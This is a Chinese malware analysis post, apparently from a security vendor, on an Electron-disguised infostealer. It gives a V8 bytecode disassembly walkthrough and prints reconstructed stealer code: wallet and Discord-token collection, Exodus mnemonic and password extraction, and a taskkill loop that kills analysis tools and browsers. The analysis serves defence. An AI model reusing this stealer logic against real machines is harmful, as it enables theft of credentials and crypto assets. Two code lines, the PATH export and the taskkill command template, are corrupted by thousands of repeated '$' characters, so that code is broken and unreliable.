# 秒盗账号钱包！伪装Electron程序暗藏后门窃取加密数据

> **作者**: 火绒安全实验室 | **发布时间**: 2026-05-08 11:13:00 | **版块**: 『病毒分析区』 | **查看/回复**: 3016 / 13
> **原文**: [https://www.52pojie.cn/thread-2106643-1-1.html](https://www.52pojie.cn/thread-2106643-1-1.html)

---

*本帖最后由 火绒安全实验室 于 2026-5-8 16:54 编辑*

近期，火绒威胁情报中心针对SeanPalia样本的分析发现，这是一款伪装为正常 Electron桌面程序运行的信息窃取木马。样本启动后，会通过main.js加载经过bytenode 编译的decrypted\_payload.jsc，并以运行时恢复方式释放主payload。随后，程序会先结束抓包、调试和逆向分析工具，并批量关闭浏览器进程以释放数据库文件锁；之后通过系统性扫描浏览器、Discord、桌面钱包与浏览器钱包扩展等高价值目标，读取Login Data、Web Data、Cookies、History、Bookmarks、Local Storage/leveldb 等本地敏感数据，同时恢复Local State中的Chromium密钥并解密受保护的数据。

进一步分析显示，该样本还会额外下载并装载第二阶段payload2，用于处理Chromium App-Bound等更难直接提取的受保护数据。在完成本地窃取后，样本还会调用Discord API富化账号资料，补充支付方式、礼品码、好友和 guild信息，并收集公网 IP、主机硬件、系统信息以及游戏 / 工具存在性等受害者画像。最终，所有窃取结果会被加密、压缩、归档并上传到多个临时文件平台，同时将下载链接、压缩包密码和受害者摘要回传至攻击者控制端，形成一条完整的信息窃取、画像评估与集中出网链路，最终造成个人隐私泄露、账号被盗、数字钱包资产损失等严重后果。目前，火绒安全产品已实现对该恶意样本的拦截与查杀。

![](https://attach.52pojie.cn/forum/202605/08/110806eld9ygngu49godci.png)

查杀图

**技术背景**

Electron 是一种基于 Chromium 与 Node.js 的跨平台桌面应用框架，凭借开发成本低、生态完善以及可直接调用系统能力等特点，被大量桌面软件采用。但与此同时，Electron 应用通常会携带完整的 Node.js 运行环境，并通过 ASAR、JavaScript、V8 字节码或原生模块加载业务代码，这也使其逐渐成为攻击者投毒和隐藏恶意逻辑的载体。

SeanPalia 正是这类风险的典型样本。该程序表面上伪装为正常 Electron 应用，实际在启动后通过入口脚本加载恶意 V8 字节码载荷，并进一步执行浏览器数据窃取、Discord 信息窃取、加密货币钱包扫描、受保护数据解密、数据打包以及多通道上传等恶意行为。综合其执行链路与业务目标判断，该样本属于 Electron 形态的信息窃取木马。

流程图如下：

![](https://attach.52pojie.cn/forum/202605/08/125809s1un001t49o71h4r.png)

**一、样本分析**

**1. 初始阶段**

初始化时期目的：样本在启动阶段会准备 Electron 与 Node.js 执行环境，并通过入口脚本加载核心 payload，从而让后续恶意模块能够在受害者系统中执行。

Electron 基础结构：Electron 由 Chromium 与 Node.js 组成，开发者可以使 HTML、CSS JavaScript 构建跨平台桌面程序。一个基础 Electron 应用通常包含 package.json、main.js 和页面文件，并由 Electron 可执行文件负责启动 。

Electron 的优势主要包括：

● 兼容性较好：应用绑定指定版本 Chromium，开发者无需额外处理大量浏览器兼容问题。

● Node.js 能力完整：前端页面或主进程可调用文件系统、进程、网络、系统信息等 Node.js API。

● 网络访问灵活：可直接使用 Node.js 网络模块 npm 依赖发起请求。

● 扩展能力强：可通过 npm 模块或原生扩展调用更多系统能力。

Electron 投毒原理：Electron 应用通常会将业务代码打包到 resources 目录下的 ASAR 文件中。攻击者可通过解包 ASAR 后篡改源码或依赖、替换入口脚本、植入加载器，或者利用调试模式注入恶意代码，从而实现命令执行、持久化、数据窃取或后门控制。Electron 程序带有可信数字签名，若投毒过程未改动外层主程序可执行文件，签名状态不受破坏，则极易降低用户安全警惕。

Electron 主程序图：

![](https://attach.52pojie.cn/forum/202605/08/110842sofyw5zgcmgykywy.png)

resources 下的 ASAR 文件图：

![](https://attach.52pojie.cn/forum/202605/08/110857j1rlz11q320omrn8.png)

解包后得到 main.js、配置文件和被引用模块图：

![](https://attach.52pojie.cn/forum/202605/08/110912ndj44f1ft36d9m69.png)

分析 main.js 后发现，其主要作用并非正常业务逻辑，而是作为 payload 加载器继续引入后续恶意代码：

payload是由9Bgr5Cugh6G3UuU1.enc aes解密后得到的V8 Bytecode文件

9Bgr5Cugh6G3UuU1.enc图：

![](https://attach.52pojie.cn/forum/202605/08/110931v3q028tm0znme2dr.png)

V8 Bytecode jsc文件图:

![](https://attach.52pojie.cn/forum/202605/08/110952i0assqrhhq904sse.png)

**二、V8 Bytecode 反汇编 / 反编译过程**

**V8 是什么？**

**V8**是由**Google 开发的高性能 JavaScript 引擎**，最初用于 **Chrome 浏览器**，现在也被 Node.js 使用。

它的主要职责是把 JavaScript **源码**执行成机器能理解的指令，让浏览器或服务器快速运 JS 代码：

**Bytecode 执行**：源码可以被编译为 V8 bytecode，别人拿到文件后难以直接看懂或运行。

**怎么反编译？**

先把 V8 序列化出来的字节码结构、常量池 BytecodeArray 打印出来，再据此做进一步反混淆和语义恢复。对 SeanPalia 这类 Electron/Node 样本，这一步的价值主要有四点：

● 确认样本使用的 V8 版本，保证后续字节码解析口径一致。

● 直接拿到 SharedFunctionInfo、常量池、对象模板等运行时结构。

● 绕过 bytenode/JSC 只给缓存字节码、不带原始源码的问题。

● 可以配合[原创]V8 Bytecode反汇 反编译不完全指南-逆向工程-看雪安全社区｜专业技术交流与安全研究论坛配合阅读。（点击文章底部参考链接）。

**2.1 总体思路**

对这类 .jsc 文件，最稳的做法通常是：

1. 确认 Electron / Node / V8 版本

2. 拉取对应版本的 V8 源码

3. 在 V8 内部打印 SharedFunctionInfo、BytecodeArray、FixedArray 等结构

4. 编译一个最小的字节码加载器，把目标 .jsc 当作 CachedData 喂给 V8

5. 收集反汇编输出，再进入后续脚本化清洗、重命名和业务还原

这一步更准确地说是“反汇编 + 结构化打印”，而不是传统意义上的完整反编译。

**2.2 拉取对应版本的 V8 源码**

先安装最基本的构建依赖：

```
apt-get install ninja-build clang pkg-config
```

安装 depot\_tools：

```
mkdir ~/v8tools
cd ~/v8tools
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
export PATH=~/v8tools/depot_tools:$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$PATH
```

拉取 V8 源码：

```
mkdir ~/v8
cd ~/v8
fetch v8
cd v8
```

切换到与目标字节码匹配的版本。本文样本分析时使用的是：

```
git checkout refs/tags/10.4.132.24
gclient sync -D
```

这里版本必须尽量对齐目标 Electron/Node 所携带 V8。版本不匹配时，即使能绕过部分校验，输出结构也很容易错位。

**2.3 修改 V8 以打印字节码结构**

V8 内部本来就具备 Disassemble()、对象打印和 SharedFunctionInfoPrint() 能力，但默认这些能力主要服务于调试构建和源码调试。为了让它直接消费 .jsc 并吐出结构，我们需要做几处定点修改：

**1. 放宽反序列化检查并打印 SharedFunctionInfo**

修改 src/snapshot/code-serializer.cc：

● CodeSerializer::Deserialize 成功拿到结果后打印 SharedFunctionInfo

● SerializedCodeData::SanityCheck() 中临时直接返回成功，绕过一部分缓存校验。

插入的核心打印逻辑如下：

```
std::cout << "\nStart SharedFunctionInfo\n";   
    result->SharedFunctionInfoPrint(std::cout);   
    std::cout << "\nEnd SharedFunctionInfo\n";   
    std::cout << std::flush;
```

这里 Start SharedFunctionInfo / End SharedFunctionInfo 最好保持稳定，方便后续脚本按标记切分输出。

**2. 打印 BytecodeArray**

修改 src/diagnostics/objects-printer.cc，在 SharedFunctionInfo::SharedFunctionInfoPrint(std::ostream& os) 中：

● 注释 PrintSourceCode(os);

● 在合适位置补上 BytecodeArray 打印

核心逻辑如下：

```
os << "\nStart BytecodeArray\n";   
    this->GetActiveBytecodeArray().Disassemble(os);   
    os << "\nEnd BytecodeArray\n";   
    os << std::flush;
```

这样输出里就不只是函数壳，还能直接拿 Ignition 字节码指令流。

**3. 打印常量池和对象模板**

修改 src/objects/objects.cc，重点是 HeapObject::HeapObjectShortPrint 里几个常见结构分支：

● FIXED\_ARRAY\_TYPE

● FIXED\_DOUBLE\_ARRAY\_TYPE

● OBJECT\_BOILERPLATE\_DESCRIPTION\_TYPE

● SHARED\_FUNCTION\_INFO\_TYPE

可以给这些分支加上带分隔符的打印，例如：

```
os << "\nStart FixedArray\n";   
    FixedArray::cast(*this).FixedArrayPrint(os);   
    os << "\nEnd FixedArray\n";
```

以及：

```
os << "\nStart ObjectBoilerplateDescription\n";   
  ObjectBoilerplateDescription::cast(*this).ObjectBoilerplateDescriptionPrint(os);   
os << "\nEnd ObjectBoilerplateDescription\n";
```

通过该方式开展后续逆向分析时，就能把常量池、对象字面量模板和函数元数据一起还原出来，而不是只看到一串指令。

**4. 避免字符串打印被截断**

修改 src/objects/string.cc String::StringShortPrint，把过长字符串的截断逻辑临时关掉。否则很多 URL、混淆字符串表、脚本片段只会显示前半截，后面还需额外回补。

**5. 需要时放宽 magic number 校验**

如果样本字节码和本地 V8 版本只接近、不完全一致，可以进一步修 src/snapshot/deserializer.cc 中的 magic number 检查。常见做法是临时去掉：

```
CHECK_EQ(magic_number_, SerializedData::kMagicNumber);
```

**2.4 最小字节码加载器**

改完 V8 后，还需要一个极小的加载器把目标 .jsc 输入到 ScriptCompiler::CachedData。示例：

```
#include <fstream>
#include <iostream>
#include <vector>
#include "libplatform/libplatform.h"
#include "v8.h"
using namespace v8;
static Isolate* isolate = nullptr;
static void loadBytecode(uint8_t* bytecodeBuffer, int length) {
  ScriptCompiler::CachedData* cachedData =
      new ScriptCompiler::CachedData(bytecodeBuffer, length);
  ScriptOrigin origin(isolate, String::NewFromUtf8Literal(isolate, "code.jsc"));
  ScriptCompiler::Source source(
      String::NewFromUtf8Literal(isolate, ""dummy""),
      origin,
      cachedData);
  ScriptCompiler::CompileUnboundScript(
      isolate,
      &source,
      ScriptCompiler::kConsumeCodeCache);
}
static void readAllBytes(const std::string& path, std::vector<char>& buffer) {
  std::ifstream input(path, std::ios::binary);
  input.seekg(0, input.end);
  size_t length = input.tellg();
  input.seekg(0, input.beg);
  if (length > 0) {
    buffer.resize(length);
    input.read(buffer.data(), length);
  }
}
int main(int argc, char* argv[]) {
  V8::SetFlagsFromString("--no-lazy --no-flush-bytecode");
  V8::InitializeICU();
  std::unique_ptr<Platform> platform = platform::NewDefaultPlatform();
  V8::InitializePlatform(platform.get());
  V8::Initialize();
  Isolate::CreateParams createParams;
  createParams.array_buffer_allocator =ArrayBuffer::Allocator::NewDefaultAllocator();
  isolate = Isolate::New(createParams);
  Isolate::Scope isolateScope(isolate);
  HandleScope handleScope(isolate);
  std::vector<char> data;
  readAllBytes(argv[1], data);
  loadBytecode(reinterpret_cast<uint8_t*>(data.data()), static_cast<int>(data.size()));
}
```

这段程序本身不负责“反混淆”，仅负责将.jsc文件安全传入经篡改的V8引擎，并触发前面加进去的结构化打印。

**2.5 编译 V8 与加载器**

先生成构建目录：

```
./tools/dev/v8gen.py x64.release
```

然后编辑 out.gn/x64.release/args.gn，常用参数如下：

```
dcheck_always_on = false   
    is_component_build = false   
    is_debug = false   
    target_cpu = "x64"   
    use_custom_libcxx = false   
    v8_monolithic = true   
    v8_use_external_startup_data = false   
    v8_static_library = true   
    v8_enable_disassembler = true   
    v8_enable_object_print = true
```

如果目标 Node/Electron 携带的 V8，必要时还要根据版本处理压缩指针或沙箱相关配置。例如某些环境下需要：

```
v8_enable_pointer_compression = false
```

再编译：

```
ninja -C out.gn/x64.release v8_monolith
```

最后把前面的最小加载器链接到编译产物上，执行方式就是：

```
./v8dasm target.jsc > disasm.txt
```

**2.6 这一阶段的实际产出**

完成后，通常可以得到这些材料：

● SharedFunctionInfo

● BytecodeArray

● FixedArray 常量池

● ObjectBoilerplateDescription

● 长字符串、URL、对象模板、函数引用关系

再通过 v8View 对前面导出的 disasm.txt 做后处理，就能得到对应的 .js 文件。使用方式只需要理解成三步：

1. 先用修改后的 V8 导出 disasm.txt

2. 再把 disasm.txt 交给 v8View

3. v8View 输出可继续分析的 .js 文件

**三、decrypted\_payload.jsc**

decrypted\_payload.jsc反编译后是一个装载层，它装载 **BAVSItA** 这一大段混淆的 js 代码业务模块。

从当前分析结果看，decrypted\_payload.jsc 本身更像**恢复器 / 装载层**，它的作用不是直接承载完整恶意业务，而是把真正的主逻辑 body 恢复出来，再通过 new Function("BAVSItA", "deps", body) 动态构造入口函数。这里的 BAVSItA 才是当前分析到的那份大块混淆主文件，也是后续所有浏览器、Discord、钱包、上传和 payload2 逻辑真正挂载的地方。

**代码：**

```
// 非可执行伪代码：只用于说 decrypted_payload.jsc 的装载关系   
    (function bootstrapRecoveredJsc() {   
      const BAVSItA = { /* 当前混淆主文件在运行时对应的配置/上下文对象 */ };   
      const deps = { /* fs / path / crypto / dpapi / http / child_process 等依赖 */ };   
         
      // jsc 里恢复出来的是一整块 body 文本   
      const body = "/* recovered body text */";   
         
      // decrypted_payload.jsc 自己不直接展开主业务，   
      // 而是只负责把恢复出的 body 交给 new Function 组出入口   
      const recoveredEntry = new Function("BAVSItA", "deps", body);   
         
      // 真正进入主逻辑的是 BAVSItA，而不是 decrypted_payload.jsc 自己   
      return recoveredEntry(BAVSItA, deps);   
    })();
```

这里需要特别区分两层：

● decrypted\_payload.jsc

○ 负责恢复 body

○ 负责调用 new Function("BAVSItA", "deps", body)

○ 负责把依赖注入进去

● BAVSItA

○ 才是当前那份真正承载主业务逻辑的混淆文件

○ 内部再继续展开反分析、目标发现、浏览器数据采集、钱包采集、Discord 富化、payload2 下载装载、归档上传与 C2 回传。

因此，对 SeanPalia 来说，decrypted\_payload.jsc 更准确的定位不是“完整恶意逻辑本体”，而是**恶意主逻辑的恢复与装载入口**；真正需要持续反混淆和语义分析的核心对象，是传入 new Function(...) BAVSItA 主体。

**四、恶意行为详解：BAVSItA 混淆主体**

**前置说明： 反混淆对应文件**

导出BAVSItA得到业务混淆文件图：

![](https://attach.52pojie.cn/forum/202605/08/111024q9awg5zcz9ywwm95.png)

文件内容图：

![](https://attach.52pojie.cn/forum/202605/08/111047a0aataym1wa7yaaz.png)

后面的业务代码都是反混淆后的再进行修饰的代码，这里以钱包总入口为例：

反混淆过的原始代码：

```
async function collectBrowserWalletTokenBundle(...e67guKE){
  var xIlSGc={
    Psj1cL(...e67guKE){return collectChromiumLoginDataByTarget(...e67guKE)},
    Mo7Wwi(...e67guKE){return _SHQR5(...e67guKE)},
    eA6n_l6(...e67guKE){return PX8GL2B(...e67guKE)},
    PemkRM(...e67guKE){return collectDiscoveredDiscordTokenFiles(...e67guKE)}
  };
```

这个 xIlSGc 可以先理解成一个局部“结构体 / 转发对象”。把浏览器登录数据、桌面钱包、浏览器钱包扩展、token 文件这几类子流程统一挂载后，再传给下游函数处理。

**字段对应关系：**

● Psj1cL

○ 类型：局部转发方法名

○ 实际调用：collectChromiumLoginDataByTarget(...)

○ 最终业务名：collectChromiumLoginDataByTarget

● Mo7Wwi

○ 类型：局部转发方法名

○ 实际调用：\_SHQR5(...)

○ 说明：\_SHQR5 这一支处理的是桌面钱包目标路径

○ 最终业务名：collectDesktopWalletArtifacts

● eA6n\_l6

○ 类型：局部转发方法名

○ 实际调用：PX8GL2B(...)

○ 说明：PX8GL2B 这一支处理的是浏览器钱包扩展目标路径

○ 最终业务名：collectBrowserExtensionWalletArtifacts

● PemkRM

○ 类型：局部转发方法名

○ 实际调用：collectDiscoveredDiscordTokenFiles(...)

○ 最终业务名：collectDiscoveredDiscordTokenFiles

前者只是当前局部对象里的槽位名，后者才是真正被调用的下游函数。后面的语义名，则是根据这些下游函数实际处理的目标对象总结出来的。

整条推导链可以按下面这条顺序理解：

1. 先从外层 wrapper 看调用关系
Mo7Wwi -> \_SHQR5
eA6n\_l6 -> PX8GL2B

2. 再看这两个真实下游函数分别处理什么目标集合
\_SHQR5 处理桌面钱包目标路径
PX8GL2B 处理浏览器钱包扩展目标路径

3. 最后按它们实际处理的对象，给出业务语义名
\_SHQR5 -> collectDesktopWalletArtifacts
PX8GL2B -> collectBrowserExtensionWalletArtifacts

4. 再把局部转发名替换成可读函数名，得到整理后的版本

```
async function collectBrowserWalletTokenBundle(...e67guKE){
  var xIlSGc={
    collectChromiumLoginDataByTarget(...e67guKE){return collectChromiumLoginDataByTarget(...e67guKE)},
    collectDesktopWalletArtifacts(...e67guKE){return collectDesktopWalletArtifacts(...e67guKE)},
    collectBrowserExtensionWalletArtifacts(...e67guKE){return collectBrowserExtensionWalletArtifacts(...e67guKE)},
    collectDiscoveredDiscordTokenFiles(...e67guKE){return collectDiscoveredDiscordTokenFiles(...e67guKE)}
  };
        return _hBIlH(e67guKE, xIlSGc);
}
```

**1. 钱包与扩展资产采集**

这一部分在代码内部主要做三件事：先枚举硬编码的钱包路径和浏览器扩展路径，再把命中的目录、配置文件和相关资产复制进归档区，最后对少数高价值钱包继续做更深一层的数据恢复。像 Exodus 这类目标，代码不只是判断目录是否存在，还会继续读 seed.seco、passphrase.json 一类文件，并调用助记词/密码恢复逻辑，尽量把“目录存在”提升成“可直接利用的钱包材料”

**1.1 钱包总入口**

**功能解析：**

1. 统一协调多类高价值资产来源

2. 不只拿钱包目录，也顺带纳入浏览器凭据 token 文件：

3. 是“钱包与资产归档”主入口

**运行结果：**

● 形成桌面钱包、浏览器钱包扩展、凭据与 token 文件的统一资产归档

**动态参数：**

● 入口动态依赖：

○ 浏览器登录数据归档结

○ 桌面钱包目录

○ 浏览器钱包扩展目

○ 已发 token 文件

**参数：**

● collectChromiumLoginDataByTarget

○ 浏览器登录数据采集入

● collectDesktopWalletArtifacts

○ 桌面钱包目录采集

● collectBrowserExtensionWalletArtifacts

○ 浏览器钱包扩展采

● collectDiscoveredDiscordTokenFiles

○ token 文件补充采集

**代码：**

```
/**
* 组合浏览器登录数据、桌面钱包、浏览器钱包扩展、token 文件四类来源
*/
// 浏览器凭据与钱包资产会被统一合并进一条高价值资产收集链
async function collectBrowserWalletTokenBundle(...e67guKE){
  var xIlSGc={
    collectChromiumLoginDataByTarget(...e67guKE){return collectChromiumLoginDataByTarget(...e67guKE)},
    collectDesktopWalletArtifacts(...e67guKE){return collectDesktopWalletArtifacts(...e67guKE)},
    collectBrowserExtensionWalletArtifacts(...e67guKE){return collectBrowserExtensionWalletArtifacts(...e67guKE)},
    collectDiscoveredDiscordTokenFiles(...e67guKE){return collectDiscoveredDiscordTokenFiles(...e67guKE)}
  };
  return _hBIlH(e67guKE, xIlSGc);
}
```

**1.2 Exodus 助记词 / 密码恢复**

**功能解析：**

1. 检查 Exodus 是否存在

2. 不只复制目录，还尝试深入恢复 mnemonic和password

3. 恢复成功后再组装成上报内容

**运行结果：**

● 可能得到 mnemonic

● 可能得到 password

● 也可能无结果返回

**读取目标 / 请求目标：**

```
C:\Users\Administrator\AppData\Roaming\exodus\exodus.wallet\seed.secopassphrase.json
```

**动态参数：**

● 关键动态依赖：

○ seco-file

○ bitcoin-seed

○ bip39

**参数：**

● readPassphraseJson

○ 读取钱包相关配置

● collectPasswordIfNeeded

○ 必要时收集口

● decodeMnemonic

○ 尝试恢复助记

**代码：**

```
/**   
     * 检 Exodus 钱包并尝试恢 mnemonic / password     
     */   
    async function extractExodusMnemonicAndPassword(deps) {   
      try {   
        // 读取 Exodus  passphrase 配置或相关钱包元信息   
        const passphraseInfo = await deps.readPassphraseJson();   
         
        // 某些情况下需要先拿到用户口令，才能继续解密内部内     
        const password = await deps.collectPasswordIfNeeded();   
         
        // 尝试把钱包内部数据还原成助记     
        const mnemonic = await deps.decodeMnemonic(passphraseInfo, password);   
        if (!mnemonic && !password) return null;   
         
        return { mnemonic: mnemonic ?? undefined, password: password ?? undefined };   
      } catch {   
        return null;   
      }   
    }
```

**2. 反分析 / 反调试**

这一部分在代码内部会先准备一长串目标进程名，然后循环调用 taskkill /IM "<name>" /F /T 去结束抓包、调试、逆向、监控和部分浏览邮件客户端进程。实现上它不会因为单个结束失败就停下，而是继续处理下一个目标，并在每轮之间插入短延时。这样做一方面是为了降低被分析到的概率，另一方面也是为了释放浏览器数据库、配置文件和会话文件的占用锁。

**2.1 结束目标进程**

**功能解析：**

1. 构造一大批目标进程名列表

2. 对每个进程执 taskkill /IM "<name>" /F /T

3. 即使单个结束失败，也不会中断整体流程

4. 每轮之间加入短延时，避免系统调用过密

**运行结果：**

● 强制关闭浏览器、邮件客户端及部分分析相关程序

● 释放数据库和配置文件锁

**读取目标 / 请求目标：**

```
taskkill /F /T /IM "HTTP Toolkit.exe"   
    taskkill /F /T /IM "HTTPDebuggerUI.exe"   
    taskkill /F /T /IM "HTTPDebuggerSvc.exe"   
    taskkill /F /T /IM "HTTPDebuggerPro.exe"   
    taskkill /F /T /IM "HTTP Debugger Pro.exe"
```

**动态参数：**

● 关键命令

○ taskkill /IM "<processName>" /F /T

● 关键运行条件

○ processName

○ throttleMs

**参数：**

● processNames

○ 一大批目标进程名数

● execCommand

○ 实际执行 taskkill 的命令调用函数

● delay

○ 每次结束进程后的节流等待函数组

● throttleMs

○ 节流等待时间

**代码：**

```
/**   
     * 对一大批目标进程执行 taskkill /F /T     
     */   
    async function terminateTargetProcesses(deps) {   
      for (const processName of deps.processNames) {   
        try {   
          // 对每个目标进程执行强制结     
          await deps.execCommand(`taskkill /IM "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${processName}" /F /T`);   
        } catch {   
          // 单个失败不影响整体清     
        }   
         
        // 每轮之后稍作等待，避免系统调用过于密     
        await deps.delay(deps.throttleMs);   
      }   
    }
```

**3. 目标发现与 Discord 数据窃取**

这一部分在代码内部先做目标枚举，再做 token 提取，最后做账号富化。它会按硬编码路径检 Discord 安装目录、浏览器 profile、Local State Local Storage\\leveldb，把存在的目标组织成后续采集列表；随后在 .ldb/.log 文本里匹配普通的 Discord 用户认证 token dQw4w9WgXcQ 前缀密文 token，并在需要时结合 Local State 恢复出的密钥做解密。拿 token 后，代码还会继续调 Discord API 拉用户资料、支付方式、礼品码、好友和 guild 信息，把原始 token 变成更有价值的账号画像。

